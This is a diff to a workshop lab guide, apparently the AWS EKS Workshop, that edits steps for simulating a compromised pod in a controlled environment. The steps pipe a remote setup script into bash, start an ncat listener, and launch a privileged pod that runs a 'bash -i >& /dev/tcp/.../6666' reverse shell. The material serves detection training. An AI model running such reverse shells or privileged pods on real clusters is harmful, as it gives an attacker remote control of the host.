@@ -11,7 +11,7 @@ This one is a little tricky and since we want to run it as a simulation in a con
 $ curl -fsSL https://raw.githubusercontent.com/aws-samples/eks-workshop-v2/main/lab/scripts/rshell-setup.sh | bash
 ```
 
-Open another tab in your browser and go to the [Amazon Cloud9 Console](https://console.aws.amazon.com/cloud9control/home). You should se another IDE environment with the nama `rshell`, click on the **Open** link next to the IDE environment name.
+The command output, will show another Cloud9 IDE address, copy and paste it in another browser tab, or if you prefere, open another tab in your browser and go to the [Amazon Cloud9 Console](https://console.aws.amazon.com/cloud9control/home). You should se another IDE environment with the nama `rshell`, click on the **Open** link next to the IDE environment name.
 
 On the Terminal of the new environment, you'll need to get the IP Address of the Cloud9 instance, install and run the `ncat` tool to simulate an attack tentative.
 
@@ -31,10 +31,10 @@ Ncat: Listening on 0.0.0.0:6666
 
 This last command will start listening all connections on port 6666.
 
-Now, go back to the `eks-workshop-ide` terminal, and run a new Pod that will emulate the compromised workload.
+Now, go back to the `eks-workshop-ide` terminal, and run a new Pod that will emulate the compromised workload. Replace the `<RSHELL_CLOUD9_IPADDRESS>` with the IP address noted in the earlier step.
 
 ```bash
-$ kubectl run -ti --rm --restart=Never --image=ubuntu --privileged rshell -- /bin/bash -c "bash -i >& /dev/tcp//6666 0>&1"
+$ kubectl run -ti --rm --restart=Never --image=ubuntu --privileged rshell -- /bin/bash -c "bash -i >& /dev/tcp/<RSHELL_CLOUD9_IPADDRESS>/6666 0>&1"
 If you don't see a command prompt, try pressing enter.
 ``` 
 
